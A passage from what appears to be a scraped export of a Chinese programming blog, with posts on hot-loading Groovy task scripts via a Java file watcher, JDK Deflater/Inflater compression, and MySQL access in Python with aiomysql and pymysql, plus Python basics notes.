文件 数据库 （如mysql） 缓存 （如redis) a. 数据库存储方式这种方法比较好想到，同时也好实现，所有的任务都直接存在DB的某张表中；只需要保证表中包含以下几个字段即可 task: 具体的任务脚本逻辑 state: 任务的状态（表示运行，暂停等） update: 任务的更新时间 基于上面的三个属性，判断的逻辑就清晰了 起一个check线程，不断的扫表，获取所有的任务 将当前获取的任务与上一次获取的任务进行对比 根据比对的结果，封装任务更新事件，抛给下游处理 当然在db的场景下，还有一个更简单的方式，借助mysql的dbevent事件来处理任务的变更 首先开启mysql的dbevent事件，即db中记录的新增删除变更都会抛出一个消息 监听dbevent，以此封装任务的更新事件，丢给下一层进行处理即可 说明： 从个人的角度出发，在实际的应用场景中，基于DB的存储方案是比较合适的，然而我并没有去做这一个，因为相比于文件的方式，有点重量级了； 而我自己的实际项目中，文件方式已经足够解决我的需求了 b. 文件存储方式这个可以说是最先想到，也是最容易实现的一种方式了。我的所有任务都放在指定的目录下，然后监听这个目录下所有文件的变动即可 QuickTask项目中，默认的实现方式，就是基于文件存储的动态任务监听，好处是简单，实现简单，理解简单，用起来也简单 c. 缓存存储方式无非是拿缓存做db存储的思路，也没有啥其他的讲究，当然我并没有想过真的去拿缓存来实现，感觉这种实现方式有点非主流，当然也没有什么明显的优势 2. 任务监听的实现上面是基本上把我如何实现动态任务监听的想法都写出来了，接下来就是具体的实现了，采用本地文件来存储具体的任务脚本，那么任务变化监听，就转换为了目录下文件变动的监听了 到了这一步，具体的实现方案就出来了，要实现文件变动监听，jdk7就提供了WatchService，当然还有大名鼎鼎的 commons-io，两个都可以实现，下面贴出commons-io的实现方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071@Slf4jpublic class TaskChangeWatcher { private static final String SCRIPT_TYPE = \".groovy\"; public static boolean registerWatcher(File file) { try { long period = TimeUnit.SECONDS.toMillis(1); // 使用commons-io的文件观察器，实现文件动态变动的监听 FileAlterationObserver observer = new FileAlterationObserver(file, FileFilterUtils.and(FileFilterUtils.fileFileFilter())); observer.addListener(new TaskChangeListener()); FileAlterationMonitor monitor = new FileAlterationMonitor(period, observer); monitor.start(); return true; } catch (Exception e) { log.error(\"register watcher for script task change error! file: {} e:{}\", file.getAbsolutePath(), e); return false; } } static final class TaskChangeListener extends FileAlterationListenerAdaptor { private boolean ignore(File file) { return !file.getName().endsWith(SCRIPT_TYPE); } private void addTask(File file) { ITask script = ScriptLoadUtil.loadScript(file); if (script == null) { return; } // 更新context中缓存，并启动任务 ScriptTaskDecorate task = new ScriptTaskDecorate(script); TaskContainer.registerTask(file.getAbsolutePath(), task); } @Override public void onFileCreate(File file) { if (ignore(file)) { return; } addTask(file); // 在线程池中执行task log.info(\"add task : {}\", file.getAbsolutePath()); } @Override public void onFileChange(File file) { if (ignore(file)) { return; } addTask(file); // 在线程池中执行task log.info(\"task changed : {}\", file.getName()); } @Override public void onFileDelete(File file) { if (ignore(file)) { return; } // 文件删除，表示需要卸载旧的task TaskContainer.removeTask(file.getAbsolutePath()); log.info(\"task delete: {}\", file.getName()); } }} 上面的实现，核心就是注册目录变动的监听，当出现文件的变化时，判断是否为groovy脚本，然后加载任务，并丢给任务容器进行调度执行 对于文件变动的监听的具体方案和讲解，如有疑问可以参考我之前的一篇博文: Java可以如何实现文件变动的监听 II. 其他0. 相关博文： 180628-动态任务执行框架想法篇 180702-QuickTask动态脚本支持框架整体介绍篇 180723-Quick-Task 动态脚本支持框架之结构设计篇 项目： https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/07/29/180729-Quick-Task-动态脚本支持框架之任务动态加载/"},{"title":"180918-JDK之Deflater压缩与Inflater解压","text":"JDK 压缩与解压工具类在实际的应用场景中，特别是对外传输数据时，将原始数据压缩之后丢出去，可以说是非常常见的一个case了，平常倒是没有直接使用JDK原生的压缩工具类，使用Protosutff和Kryo的机会较多,正好在实际的工作场景中遇到了，现在简单的看下使用姿势 I. 压缩与解压工具类1. 基本实现主要借助的就是Deflater, Inflater两个工具类，其使用姿势如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static String uncompress(byte[] input) throws IOException { Inflater inflater = new Inflater(); inflater.setInput(input); ByteArrayOutputStream baos = new ByteArrayOutputStream(input.length); try { byte[] buff = new byte[1024]; while (!inflater.finished()) { int count = inflater.inflate(buff); baos.write(buff, 0, count); } } catch (Exception e) { e.printStackTrace(); } finally { baos.close(); } inflater.end(); byte[] output = baos.toByteArray(); return new String(output, \"UTF-8\");}public static byte[] compress(byte[] data) throws IOException { byte[] output; Deflater compress = new Deflater(); compress.reset(); compress.setInput(data); compress.finish(); ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length); try { byte[] buf = new byte[1024]; while (!compress.finished()) { int i = compress.deflate(buf); bos.write(buf, 0, i); } output = bos.toByteArray(); } catch (Exception e) { output = data; e.printStackTrace(); } finally { bos.close(); } compress.end(); return output;} 一个简单的测试 123456789101112public static void main(String[] args) throws IOException { StringBuilder builder = new StringBuilder(); for (int i = 0; i &lt; 200; i++) { builder.append('a' + (new Random().nextInt() * 26)); } String text = builder.toString(); byte[] compres = compress(text.getBytes()); System.out.println(compres.length + \" : \" + text.getBytes().length); String res = uncompress(compres); System.out.println(\"uncompress! \\n\" + text + \"\\n\" + res);} 输出结果 12341011 : 1974uncompress! 1159641073884270587-148914555-876348695-140903655914152858511750740619-504526839109631208315104321891746743931-228808979-1303586499-19431155411964999751-1784318475-954798177-1812907183-831342707-3149322476028964551802022597-269963287-6384200011467670385844411707877038035412670417-1119826115558346219-959513147646693111435818855-32626587-18184494797054550038966016212145089137523302939171183465807867207-5294746515903446057333959811216956465-11772186456902770294071039871896527261-126190055310658640239029635411410052621945318513-1099749933-2044334159884087065-1705740759-1313321287-1408007761-12659778231544522691472523171153203782987609706919936632357801287155512488271333115291-1121944135941979389-179880545175884207196204559-2097788799145839653133892163716038492252042396151523357607329397509-2453452914618397691174247129-542507633-1893723573237001573-84175562119492726191070559557-875056377-1763237523-662399435-170798495-12405874171550890051-1938474621-701626601-1246867757-1138873077164155271023310391435811251050668025181338411-7641844471088518205-1570482881-1690731767-954924683-213656821149494003-544272515-9322840891981997411254437701-183054198720365002211448655569-54030518916444117051191350451-900732825-2072105047160877226512403288354302424851213478975-57604286986096457192173124564975571096304687-213425653510984804314132356831371957625714091709-327695077-182546427-372769058150182636433743131293942149315625331-1010625457741185365-81246881-565236593-1937214707-2090999425-1673181289-1110250756450022071917863643-127217577910228760391902441297-31318475-535669437-1151216791170962161121375401911260706331-1873591233-495048743-8876731551362670289-686442615-6752584831233249861-3467630691547253127-345092207-908370541-1788351797644350365-67770933-4703179231930520693138257968522450375-1171662023-5791753311816936409-1745781765-922801857281665531707439257928142703-367587763829971705455779401438501763-1398546079-606883161-924403277-1617582925-20054118412791159031159641073884270587-148914555-876348695-140903655914152858511750740619-504526839109631208315104321891746743931-228808979-1303586499-19431155411964999751-1784318475-954798177-1812907183-831342707-3149322476028964551802022597-269963287-6384200011467670385844411707877038035412670417-1119826115558346219-959513147646693111435818855-32626587-18184494797054550038966016212145089137523302939171183465807867207-5294746515903446057333959811216956465-11772186456902770294071039871896527261-126190055310658640239029635411410052621945318513-1099749933-2044334159884087065-1705740759-1313321287-1408007761-12659778231544522691472523171153203782987609706919936632357801287155512488271333115291-1121944135941979389-179880545175884207196204559-2097788799145839653133892163716038492252042396151523357607329397509-2453452914618397691174247129-542507633-1893723573237001573-84175562119492726191070559557-875056377-1763237523-662399435-170798495-12405874171550890051-1938474621-701626601-1246867757-1138873077164155271023310391435811251050668025181338411-7641844471088518205-1570482881-1690731767-954924683-213656821149494003-544272515-9322840891981997411254437701-183054198720365002211448655569-54030518916444117051191350451-900732825-2072105047160877226512403288354302424851213478975-57604286986096457192173124564975571096304687-213425653510984804314132356831371957625714091709-327695077-182546427-372769058150182636433743131293942149315625331-1010625457741185365-81246881-565236593-1937214707-2090999425-1673181289-1110250756450022071917863643-127217577910228760391902441297-31318475-535669437-1151216791170962161121375401911260706331-1873591233-495048743-8876731551362670289-686442615-6752584831233249861-3467630691547253127-345092207-908370541-1788351797644350365-67770933-4703179231930520693138257968522450375-1171662023-5791753311816936409-1745781765-922801857281665531707439257928142703-367587763829971705455779401438501763-1398546079-606883161-924403277-1617582925-2005411841279115903 2. 注意事项上面这个运作的还挺好，但在接入使用时，总是提示java.util.zip.DataFormatException: incorrect header check, 因为接受的是第三方传递过来的压缩数据，比较坑爹的是对方就写了个Deflater压缩，然后什么都没有了，那么这个是啥原因呢？ 其实看下Deflater的构造方法，发现还可以传一个boolean值(nowrap), 官方说明是 12345678910111213/** * Creates a new compressor using the specified compression level. * If 'nowrap' is true then the ZLIB header and checksum fields will * not be used in order to support the compression format used in * both GZIP and PKZIP. * @param level the compression level (0-9) * @param nowrap if true then use GZIP compatible compression */public Deflater(int level, boolean nowrap) { this.level = level; this.strategy = DEFAULT_STRATEGY; this.zsRef = new ZStreamRef(init(level, DEFAULT_STRATEGY, nowrap));} 简单来说，就是压缩时，如果nowrap为true，那么解压时也要为true；否则对不上时，就会抛异常 接下来简单对比下两种不同传参的情况，首先更新下工具类 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static String uncompress(byte[] input, boolean nowrap) throws IOException { Inflater inflater = new Inflater(nowrap); inflater.setInput(input); ByteArrayOutputStream baos = new ByteArrayOutputStream(input.length); try { byte[] buff = new byte[1024]; while (!inflater.finished()) { int count = inflater.inflate(buff); baos.write(buff, 0, count); } } catch (Exception e) { e.printStackTrace(); } finally { baos.close(); } inflater.end(); byte[] output = baos.toByteArray(); return new String(output);}public static byte[] compress(byte[] data, boolean nowrap) throws IOException { byte[] output; Deflater compress = new Deflater(Deflater.DEFAULT_COMPRESSION, nowrap); compress.reset(); compress.setInput(data); compress.finish(); ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length); try { byte[] buf = new byte[1024]; while (!compress.finished()) { int i = compress.deflate(buf); bos.write(buf, 0, i); } output = bos.toByteArray(); } catch (Exception e) { output = data; e.printStackTrace(); } finally { bos.close(); } compress.end(); return output;} 测试如下 1234567891011121314151617public static void main(String[] args) throws IOException { StringBuilder builder = new StringBuilder(); for (int i = 0; i &lt; 1000; i++) { builder.append('a' + (new Random().nextInt() * 26)); } String text = builder.toString(); byte[] compres = compress(text.getBytes(), true); System.out.println(compres.length + \" : \" + text.getBytes().length); String res = uncompress(compres, true); System.out.println(res.equals(text)); byte[] compres2 = compress(text.getBytes(), false); System.out.println(compres2.length + \" : \" + text.getBytes().length); String res2 = uncompress(compres2, false); System.out.println(res2.equals(text));} 输出结果如下，从大小来看，前者小那么一点点 12345086 : 9985true5092 : 9985true 3. 小结一般来说，jdk自带的压缩与解压，除了方便之外，可能优势并不是那么的大，这里盗一张网上的对比表格 以下来自: [java]序列化框架性能对比（kryo、hessian、java、protostuff） 优点 缺点 kryo 速度快，序列化后体积小 跨语言支持较复杂 hessian 默认支持跨语言 较慢 protostuff 速度快，基于protobuf 需静态编译 Protostuff-Runtime 无需静态编译，但序列化前需预先传入schema 不支持无默认构造函数的类，反序列化时需用户自己初始化序列化后的对象，其只负责将该对象进行赋值 jdk 使用方便，可序列化所有类 速度慢，占空间 其次，在使用java的压缩与解压时，需要注意下，nowrap这个参数，需要保持一致，否则会报错 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/18/180918-JDK之Deflater压缩与Inflater解压/"},{"title":"181120-Python之Mysql异步使用篇aiomysql使用小结","text":"db的读写操作可以算是io型，对于简单的sql，获取数据的数据可能远小于传输的时间，针对这种操作，异步的访问方式就比较占优势了。本篇主要介绍在python中如何借助aiomysql来实现db的异步读写 I. 异步基本使用1. 配置本地测试时的环境参数如下 mac操作系统 python3.7.1 aiomysql 0.0.19 PyMySQL 0.9.2 asyncio 3.4.3 db参数 mysq 5.7.22 配置参数: user=root, password=, port=6579, host=127.0.0.1, db=test 表信息及数据如下图 12345678910CREATE TABLE `user` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(80) NOT NULL DEFAULT '' COMMENT '用户名', `pwd` varchar(26) NOT NULL DEFAULT '' COMMENT '密码', `isDeleted` tinyint(1) NOT NULL DEFAULT '0', `created` varchar(13) NOT NULL DEFAULT '0', `updated` varchar(13) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4; 2. 基础使用在进入正式的操作之前，有必要先过一下使用步骤，先回顾一下使用PyMySql时的基本使用姿势 首先是与db建立连接 pymysql.connect(host='127.0.0.1', port=3306, user='root', password='', db='test', charset='utf8') 根据连接得到的connect来创建光标cursor 然后通过cursor.execute('sql')来执行具体的sql语句 针对增加，删除和修改的sql命令，需要额外的提交来connect.commit()来确保所有的操作被mysql接收并落盘 如果是查询，则可以根据 cursor.fetchXXX来获取返回结果中的一条，多条或者所有数据 最后回收线程，关闭连接 对于异步的操作，基本步骤其实和上面也差不多，无非是某些耗时的io操作可以使用await来修饰，从而借助协程来提升性能，那么一个简单的使用case可以如下 123456789101112131415161718import asyncioimport aiomysqlasync def basic_test(): conn = await aiomysql.connect(host=\"127.0.0.1\", port=3306, user='root', password='', db='test', charset='utf8') cursor = await conn.cursor() await cursor.execute('select * from user limit 3') result = await cursor.fetchall() for record in result: print(\"record: \", record) await cursor.close() conn.close()loop = asyncio.get_event_loop()loop.run_until_complete(basic_test()) 上面的使用姿势，和前面的对比，基本上没有什么区别，唯一的不同就是前面的直接调用；这里需要将调用封装成协程丢到事件循环中执行 下面将主要介绍下，如何使用连接池来实现各种db的异步操作 3. 初始化接下来我们的目的是尽量开发一个通用的sql读写工具类，所以在脚本启动时，实现db的连接初始化；然后其他的db读写地方，从连接池中获取连接执行db操作，用完之后释放连接；最后在脚本结束时，关闭连接池实现资源回收 1234567891011121314151617async def register(): ''' 初始化，获取数据库连接池 :return: ''' try: print(\"start to connect db!\") pool = await aiomysql.create_pool(host='127.0.0.1', port=3306, user='root', password='', db='test', charset='utf8') print(\"succeed to connect db!\") return pool except asyncio.CancelledError: raise asyncio.CancelledError except Exception as ex: print(\"mysql数据库连接失败：{}\".format(ex.args[0])) return False 4. 获取连接和Cursor根据前面的学习，我们要操作db，前提是要现拿到连接connection, 然后通过connection来绑定光标cursor，最后通过cursor执行sql语句，所以我们接下来就是需要根据前面的pool来获取所需的参数 123456789async def getCurosr(pool): ''' 获取db连接和cursor对象，用于db的读写操作 :param pool: :return: ''' conn = await pool.acquire() cur = await conn.cursor() return conn, cur 5. 批量写入操作接下来的db操作就比较简单了，基本上和前面基础篇的使用姿势一样，并没有什么太大的区别 1234567891011121314async def batchInsert(pool, sql, values): start = now() # 第一步获取连接和cursor对象 conn, cur = await getCurosr(pool) try: # 执行sql命令 await cur.executemany(sql, values) await conn.commit() # 返回sql执行后影响的行数 return cur.rowcount finally: # 最后不能忘记释放掉连接，否则最终关闭连接池会有问题 await pool.release(conn) print(\"execute insert cost: \", now() - start) 简单看一下上面的使用姿势 1234567891011121314151617now = lambda: time.time() * 1000loop = asyncio.get_event_loop()pool = loop.run_until_complete(register()) # 批量插入records = [('一灰灰1', 'asdf', 0, int(time.time()), int(time.time())), ('一灰灰2', 'qwer', 0, int(time.time()), int(time.time()))]sql = \"insert into user(`name`, `pwd`, `isDeleted`, `created`, `updated`) values (%s, %s, %s, %s, %s)\"task = asyncio.ensure_future(batchInsert(pool, sql, records))result = loop.run_until_complete(task)print(\"insert res:\", result)# 最后关闭连接loop.run_until_complete(close(pool))loop.close() 输出结果如下 12execute insert cost: 2.943115234375insert res: 2 6. 查询经过上面的写入操作之后，查询的逻辑也比较顺了，基本上也没有啥区别 1234567891011121314async def query(pool, sql): ''' 查询, 一般流程是首先获取连接，光标，获取数据之后，则需要释放连接 :param pool: :return: ''' start = now() conn, cur = await getCurosr(pool) try: await cur.execute(sql) return await cur.fetchall() finally: await pool.release(conn) print(\"execute %s cost %d\" % (sql, now() - start)) 对应的测试case如下 1234567891011121314151617181920loop = asyncio.get_event_loop()pool = loop.run_until_complete(register())# 开始增删改查操作# 查询start = now()tasks = [ asyncio.ensure_future(query(pool, 'select * from user where id&lt;3 order by id desc limit 2')), asyncio.ensure_future(query(pool, 'select * from user where id&lt;7 order by id desc limit 2')), asyncio.ensure_future(query(pool, 'select * from user where id&lt;9 order by id desc limit 2')),]result = loop.run_until_complete(asyncio.gather(*tasks))print(\"total cose: \", now() - start)for res in result: print(\"record: \", res)# 最后关闭连接loop.run_until_complete(close(pool))loop.close() 输出结果如下： 123456789start to connect db!succeed to connect db!execute select * from user where id&lt;3 order by id desc limit 2 cost 3execute select * from user where id&lt;7 order by id desc limit 2 cost 3execute select * from user where id&lt;9 order by id desc limit 2 cost 3total cose: 4.31298828125record: ((2, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'), (1, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218'))record: ((6, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'), (5, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'))record: ((8, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'), (7, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')) 7. 关闭最后就是资源回收关闭，前面的测试用例中也都用到了 1234async def close(pool): pool.close() await pool.wait_closed() print(\"close pool!\") II. 其他参考 官方aiomysql文档! 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/20/181120-Python之Mysql异步使用篇aiomysql使用小结/"},{"title":"181113-Python基础笔记","text":"本篇记录python基础内容学习笔记 1. is 与 == is: 用于判断两个对象是否引用同一个内存地址 ==: 判断两个对象的值是否相等 2. 数字类型转换 int(x) float(x) complex(x) 复数, 实数部分为 x，虚数部分为 0。 complex(x,y) 3. 数字的操作方法 abs(x) 绝对值 ceil(x) 向上取整 exp(x) 返回e的x次幂 floor(x) 下取整 log(x) max(x…) min(x…) round(x) 四舍五入 pow(x, y) sqrt(x) 4. 随机方法 random() 随机生成 [0,1) shuffle(lst) 随机排序 uniform(x, y) 随机生成下一个实数，它在[x,y]范围内。 5. 字符串操作 字符串连接 字符串重复输出 [] 通过索引获取字符串中的字符 [:] 截取字符串中的一部分 in 成员运算符，如果字符串中包含给定的字符返回True not in 成员运算符，如果字符串中不包含给定的字符返回True r/R 原始字符串 % 格式字符串 6. 字符串内键函数 capitalize() 字符串的第一个字符串转换为大写 center(width, fillchar) count(str, beg=0, end=len(string)) 返回str在string中出现的次数 bytes.decode(encoding=”utf-8”, errors=”strict”) Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。 encode(encoding=’UTF-8’,errors=’strict’) 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’ endswith(suffix, beg=0, end=len(string)) 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False. expandtabs(tabsize=8) 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1 find(str, beg=0 end=len(string)) 跟find()方法一样，只不过如果str不在字符串中会报一个异常. isalnum() 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True,否则返回 False isalpha() 如果字符串至少有一个字符并且所有字符都是字母则返回 True, 否则返回 False isdigit() 如果字符串只包含数字则返回 True 否则返回 False.. islower() 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False isnumeric() 如果字符串中只包含数字字符，则返回 True，否则返回 False isspace() 如果字符串中只包含空白，则返回 True，否则返回 False. istitle() 如果字符串是标题化的(见 title())则返回 True，否则返回 False isupper() join(seq) 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串 len(String) 返回字符串长度 ljust(width[, fillchar]) 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。… 7. list列表，允许出现重复的数据 123s = [1, 2]# 根据元组内容来定义一个数组s = list((1,2)) 添加 1234567891011121314&gt;&gt;&gt; list=[1,2]# 在末尾追加&gt;&gt;&gt; list.append(3)&gt;&gt;&gt; list[1, 2, 3]# 在指定索引处添加&gt;&gt;&gt; list.insert(2, 'a')&gt;&gt;&gt; list[1, 2, 'a', 3]# 两个列表合成一个&gt;&gt;&gt; list + ['x', 'y'][1, 2, 'a', 3, 'x', 'y'] 删除 两个常见的删除方式, del list[index] 或者 list.pop(index)；区别在于前面是删除内存，后面是从数组中返回并删除这个元素 12345678&gt;&gt;&gt; list[1, 2, 'a', 3]# 删除指定位置的值，不传入参数时，删除最后一个&gt;&gt;&gt; list.pop(1)2&gt;&gt;&gt; del list[1]&gt;&gt;&gt; list[1, 3] 更新 可以简单看成是数组的更新方式 list[index]=xxx，需要额外注意下数组越界的问题 123456789101112&gt;&gt;&gt; list[1, 3]## 直接赋值更新&gt;&gt;&gt; list[0] = 'asd'&gt;&gt;&gt; list['asd', 3]## 更新时，注意数组越界的问题&gt;&gt;&gt; list[2] = 'da'Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;IndexError: list assignment index out of range 长度 获取数组长度，主要利用len(xx) 1234&gt;&gt;&gt; list['asd', 3]&gt;&gt;&gt; len(list)2 判断 查找列表中某个元素的下标 list.index(xx), 判断列表中是否存在 x in list 123456789101112&gt;&gt;&gt; list['asd', 3, 'asd']&gt;&gt;&gt; list.index('asd')0&gt;&gt;&gt; list.index(3)1&gt;&gt;&gt; list['asd', 3, 'asd']&gt;&gt;&gt; 3 in listTrue&gt;&gt;&gt; '3' in listFalse 清空 清空列表中所有的元素list.remove()，和删除列表del list是两码事，如下 123456789&gt;&gt;&gt; list.clear()&gt;&gt;&gt; list[]&gt;&gt;&gt; list.append(1)&gt;&gt;&gt; list[1]&gt;&gt;&gt; del list&gt;&gt;&gt; list&lt;class 'list'&gt; 空列表定义 1&gt;&gt;&gt; list=[] 遍历 除了常见的直接for循环遍历之外，如果希望在遍历数组的同时，也知道数组的下标，可以借助enumerate来遍历，更加方便 123456789101112131415&gt;&gt;&gt; for x in list:... print(x)... 1112132## 遍历时，获取下标和内容&gt;&gt;&gt; for index,val in enumerate(list):... print(index, val)... 0 11 1122 132 8. Tuple元组，和list的最主要区别是元组不能修改，不能修改，不能修改 定义 一般的定义如下 123456789&gt;&gt;&gt; t = ('a', 'b', ['A', 'B'])&gt;&gt;&gt; t[2][0]'A'&gt;&gt;&gt; t[2][1]'B'&gt;&gt;&gt; t[1]'b'&gt;&gt;&gt; t('a', 'b', ['A', 'B']) 比较特殊一点的是空元组和至于一个元素的元组，定义时，如下, 当定义一个元素的元组时，里面要加一个逗号，否则是直接赋值 123456789&gt;&gt;&gt; t=()&gt;&gt;&gt; t()&gt;&gt;&gt; t=(1,)&gt;&gt;&gt; t(1,)&gt;&gt;&gt; t=(1)&gt;&gt;&gt; t1 9. dict字典，kv结构 定义 123456789# 空字典&gt;&gt;&gt; d={}&gt;&gt;&gt; d{}# 一个普通的字典定义, kv结构&gt;&gt;&gt; d = {'a': 123, 'b': 23, 'cd': 12}&gt;&gt;&gt; d{'a': 123, 'b': 23, 'cd': 12} 获取 常见的根据key获取对应的value，有两种方式，如下 1234567891011121314&gt;&gt;&gt; d{'a': 123, 'b': 23, 'cd': 12}## get方式获取，当key不存在时，返回None&gt;&gt;&gt; d.get('a')123&gt;&gt;&gt; d.get('aa')## 通过下标方式获取，当key不存在时，抛出异常&gt;&gt;&gt; d['a']123&gt;&gt;&gt; d['aaa']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'aaa' 更新or新增 直接采用赋值的方式进行更新或添加，key存在时，表示更新；不存在时，表示添加 12345678&gt;&gt;&gt; d{'a': 'newA', 'b': 23, 'cd': 12}# 更新&gt;&gt;&gt; d['a']='ddd'# 新增&gt;&gt;&gt; d['d'] = 'add'&gt;&gt;&gt; d{'a': 'ddd', 'b': 23, 'cd': 12, 'd': 'add'} 删除 可以使用pop弹出字典中的结果，也可以使用del进行删除 12345678910&gt;&gt;&gt; d{'a': 'ddd', 'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; d.pop('a')'ddd'&gt;&gt;&gt; d{'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; d.pop('e')Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'e' 需要注意，在执行删除时，如果key不存在，会抛异常 判断存在 判断字典是否包含某个key，属于比较常见的需求了，而可以通过 in 关键字来实现 1234&gt;&gt;&gt; d{'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; 'b' in dTrue 遍历 字典的遍历与其他的几个不太一样，因为是kv结构的，如果我希望在遍历的过程中，可以同时获取key，value可以怎么办? 利用字典的 items() 方法 12345678&gt;&gt;&gt; d {'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; for k,v in d.items():... print(k, v)... b 23cd 12d add 同样，如果只是想遍历字典的value，可以如下操作 12345678&gt;&gt;&gt; d{'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; for v in d.values():... print(v)... 2312add 10. set集合，与list的最大区别就是不允许出现重复的数据 定义 两种定义方式，一个是直接用大括号，一个是借助set方法 123456&gt;&gt;&gt; s = set([1,2,3])&gt;&gt;&gt; s{1, 2, 3}&gt;&gt;&gt; s={1,2,3}&gt;&gt;&gt; s{1, 2, 3} 需要注意的是，当定义一个空集合时，只能使用 s=set(),因为 {} 表示的是空字典 新增 add方法来新增一个元素，当添加一个已经存在的元素时，不会有任何影响 123&gt;&gt;&gt; s.add('a')&gt;&gt;&gt; s{1, 2, 3, 'a'} 删除 remove方法 12345&gt;&gt;&gt; s{1, 2, 3, 'a'}&gt;&gt;&gt; s.remove('a')&gt;&gt;&gt; s{1, 2, 3} 集合操作 集合与集合之间，可以使用数学中的集合运算（交集，并集等） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/13/181113-Python基础笔记/"},{"title":"181118-Python之Mysql基本使用篇","text":"I. 基本使用篇这里主要使用mysql的基本使用姿势，也就是最常见的增删改查，这里主要是使用pymysql这个包来操作 1. 基本环境mysql环境 mysql环境搭建，基本配置如下 123456ip: 127.0.0.1port: 3306user: rootpassword: database: testtable: user 表结构如下 12345678910CREATE TABLE `user` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(80) NOT NULL DEFAULT '' COMMENT '用户名', `pwd` varchar(26) NOT NULL DEFAULT '' COMMENT '密码', `isDeleted` tinyint(1) NOT NULL DEFAULT '0', `created` varchar(13) NOT NULL DEFAULT '0', `updated` varchar(13) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; python环境 Python3.7 + pymysql 2. db连接不管什么语言，使用mysql的第一步都是建立连接，然后才能执行具体的sql语句，第一步的建连如下 1234567891011121314151617181920212223242526import pymysqldef register(): ''' 数据库连接相关的初始化操作 :return: ''' # 打开数据库连接 db = pymysql.connect(host='127.0.0.1', port=3306, user='root', password='', db='test', charset='utf8') # 使用 cursor() 方法创建一个游标对象 cursor cursor = db.cursor() # 使用 execute() 方法执行 SQL 查询 cursor.execute(\"SELECT VERSION()\") # 使用 fetchone() 方法获取单条数据. data = cursor.fetchone() print(\"Database version : %s \" % data) return db, cursordb, cursor = register() 建立连接主要就是pymysql.connect这一行的调用，成功之后会返回mysql的连接对象db;然后可以通过它获取后续进行sql语句执行的cursor对象；这两个对象后续都会使用 3. 插入插入命令简单来说就是两步 cursor.execute(sql) : 执行sql语句 db.commit() : 提交sql执行的结果 123456789101112131415161718192021222324def insertDb(cursor, db): ''' 测试向表中新插入一条数据的case :param cursor: :param db: :return: ''' print(\"-------------- start to insert one record ----------------\") # 插入一条数据 cursor.execute(''' insert into user(`name`, `pwd`, `isDeleted`, `created`, `updated`) values('test_{0}', '123456', 0, {0}, {0}) '''.format(int(time.time()))) # 提交修改，在插入、修改、删除时，需要执行下面这个命令，否则sql的执行结果不会提交到mysql（类似事物中的提交概念） db.commit() print(\"cursor.execute effect: \", 